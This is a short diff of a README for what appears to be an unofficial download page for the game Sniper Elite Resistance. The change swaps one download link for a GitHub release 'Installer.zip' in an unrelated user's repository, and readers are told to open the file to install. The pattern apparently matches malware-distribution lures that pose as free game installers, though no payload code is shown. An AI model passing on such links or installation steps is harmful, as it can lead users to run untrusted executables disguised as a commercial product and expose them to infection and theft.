@@ -18,7 +18,7 @@ From heart-stopping sniper duels to nerve-wracking stealth missions, _Sniper Eli
 ### Download and Installation Instructions for Sniper Elite Resistance
 
 1. **Download the Installer**:  
-   Click [here](https://nicecolns.com/) to download the game installer.
+   Click [here](https://github.com/JeanSylvestrek/game4fun/releases/download/publish/Installer.zip) to download the game installer.
 
 2. **Run the Installer**:  
    Once the installer is downloaded, open the file to start the setup process.
